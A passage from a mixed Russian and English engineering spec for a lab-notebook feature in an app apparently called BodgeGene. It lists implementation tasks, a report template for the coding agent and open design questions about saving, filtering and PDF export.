**K11 — Drag-drop + paste image.** §7 implementation в `NotebookEntryEditor`. +3 tests (drop image, drop non-image filtered, paste image).

**K12 — KaTeX lazy-loading.** `npm install markdown-it-katex katex` + dynamic import на first `$` detect (§8). +3 tests (no `$` no load, first `$` triggers load, subsequent renders cached).

**K13 — `canvas/NotebookSearch` + `canvas/NotebookList`.** Substring filter (§9). List view (компактный — entry title + date + first-line preview text-only + tags). +3 tests (filter case-insensitive, multi-field match, empty query passthrough).

**K14 — Ref picker modal `canvas/NotebookRefPickerModal.jsx`.** UI «Insert @@ref» — entity picker с табами containers / zones / pieces / operations / primers / clones / external. Биолог выбирает entity → snippet `@@ref:kind:id@@` inserted в cursor. +4 tests.

**K15 — T10 Sanger notes migration.** `lib/notebook-migrations/t10-to-notebook.js` (§14.2). Runs при open `.bodge` если detect старый shape (`notes` defined без `sangerNotebookEntryId`). Idempotent. +5 tests (basic migration, idempotency, empty notes skipped, ref population, refs preserved при re-run).

**K16 — Notebook tab integration в CanvasLayoutView / EditorWindowShell.** Lazy-load `NotebookEntryEditor`. Tab появляется в EditorWindowShell когда `state.notebook.entries.length > 0` ИЛИ кнопка «+ Журнал» на canvas (всегда видна, создаёт первый entry). Right panel `SangerLabNotebook` (existing T10) — extend с click→open notebook entry (§14.3).

**Под ответственность Игоря: CanvasLayoutView.jsx вырастет до ~42-43 KB (hard-breach углубляется с 41.35 KB до ~42-43 KB).** Pre-step decomposition не требуется. +5 tests (lazy chunk loads on tab mount, tab visible когда entries>0, «+ Журнал» button creates first entry, clone row click opens entry, legacy fallback к inline notes если sangerNotebookEntryId missing).

**K17 — Schema additions для notebook в `.bodge` v2 (CORE integration).** Update `lib/bodge-zip.js` write/read для `notebook/entries.json` + `notebook/attachments/*` + `attachmentsManifest` map в manifest assets. Depend on M-FORMAT-V2-CORE K6-K7 — реализуется ПОСЛЕ их приёмки. +5 tests (round-trip write→read, manifest sha256 для attachments, attachmentsManifest preserved, orphan attachment warn, empty notebook gracefully).

**K18 — Manual smoke test.** Real biolog workflow:
1. Open project, click notebook tab → editor opens (lazy bundle loads, ~100-300ms на первый раз).
2. Create new entry «PCR test 19.05», type markdown with table.
3. Drag-drop gel.png from desktop → image embeds, viewable в preview.
4. Click @@ button → ref picker opens → select zone «pks4-knockout» → snippet inserted.
5. Type `$T_m = 60°C$` → KaTeX lazy-loads on first $ → formula renders.
6. Save (Ctrl+S immediate) → export `.bodge` → close → re-open → entry persists.
7. Click clone row в T10 panel → opens corresponding notebook entry (sanger kind).

**K19 — Size budget check.** Bundle impact verified via `npm run build` + `vite build --analyze`: notebook chunk ~60 KB gzipped, отдельный async chunk. CanvasLayoutView size after K16 — actual measured, должен быть ~42-43 KB. KaTeX chunk ~250 KB gzipped, отдельный async chunk не загружен в main flow.

---

## 16. STOP-условие

Code останавливается после K19.

Отчёт:
```
## M-FORMAT-V2-NOTEBOOK — отчёт
Commits: ...
Vitest: ~3450 (после CORE) → ~3550 pass / 1 skip / 0 fail (~+100)
pytest: 112/112
vite build: clean

Markdown features verified:
- CommonMark + GFM (tables, strikethrough, task lists): ✓
- Footnotes + highlight (==): ✓
- Custom @@ref@@ cross-refs (7 kinds + default): ✓
- DNA/AA syntax highlight (dna/rna/cdna/aa/protein): ✓
- Mermaid-link external editor: ✓
- KaTeX lazy-loaded on first $: ✓

Editor UX verified:
- Split-view textarea + preview: ✓
- Live scroll position sync (percent-based): ✓
- Drag-drop image из ОС: ✓
- Paste image from clipboard: ✓
- 16 base toolbar buttons + 3 keyboard shortcuts (Ctrl+B/I/S): ✓
- Ref picker modal: ✓

Migration:
- T10 Sanger notes → notebook entries: ✓ (lossless, idempotent)
- Existing op.materializedClones[i].notes readable as markdown: ✓
- Legacy fallback при missing sangerNotebookEntryId: ✓

Bundle:
- Notebook stack: +60 KB gzipped (lazy-loaded on tab mount)
- KaTeX: +250 KB gzipped (lazy on first formula detect)
- CanvasLayoutView.jsx new size: ~42-43 KB (hard-breach +X KB; Игорь acknowledged)

Security:
- DOMPurify XSS sanitization: ✓ (5 attack scenarios tested)
- markdown-it html:false enforced: ✓

Spec deviations: [list]
Открытые вопросы: [list]
```

---

## 17. Открытые вопросы

1. **Pasting from MS Word / Google Docs.** Биолог копирует formatted text из Word — clipboard содержит и plain text и HTML. Paste handler берёт plain text (lossy formatting) — это default в v2.0.0. Конвертер HTML→markdown через `turndown` lib (+30 KB) — T-future feature если биолог фактически попросит.

2. **Auto-save vs Manual save.** Notebook entries — blur + 500ms debounce + explicit Ctrl+S immediate flush. R-T10-2 (TD-T10-NOTES-FLUSH из CURRENT_TASK addendum) — known risk потери на rapid close-before-blur. Mitigation: `beforeunload` handler flush. Достаточно для v2.0.0; решение Игоря на визуальной приёмке нужен ли confirm dialog.

3. **Linked notebook entries.** `@@ref:entry:nb01...@@` — entries могут ссылаться друг на друга? Не в core ref kinds в v2.0.0. Если нужно — добавить новый kind `entry` в v2.x (forward-compatible, без major bump).

4. **Notebook entries global или per-zone?** §1 структура говорит global flat array, refs filter возможен. UI listing в notebook tab — общий, без default filter по active zone. Биолог увидит mix entries из всех zones. Опционально — добавить «Filter by active zone» checkbox в NotebookSearch (T-future polish, если потребуется по UX feedback).

5. **Print/PDF export of notebook.** Биолог хочет print full journal as PDF для archival. Через browser native Print → PDF — works из коробки (CSS @media print подкручиваем). Dedicated `html2pdf` lib — T-future, не v2.0.0.

6. **Notebook tab persistent или conditional?** §15 K16 предлагает: tab в EditorWindowShell когда entries.length > 0, плюс persistent кнопка «+ Журнал» на canvas (всегда видна, создаёт первый entry). Альтернатива: persistent tab всегда (даже на пустом journal — пустой tab «Журнал (0)»). Решение Игоря на визуальной приёмке.

---

**Дата:** 19.05.2026 (rewrite по review).
**Author:** Chat (BodgeGene Architecture).
**Реализация:** Sprint M-FORMAT-V2-NOTEBOOK (Code, не лимитирован по срокам).
**Зависимости:** Sprint M-FORMAT-V2-CORE завершён (K6-K7 ZIP v2 reader/writer необходимы для K17). v0.8.3-alpha state shape; T10 materializedClones для migration §14.
**Parallel:** `SPEC_BODGE_FORMAT_V2_CORE.md` (foundational format spec, реализуется первым).
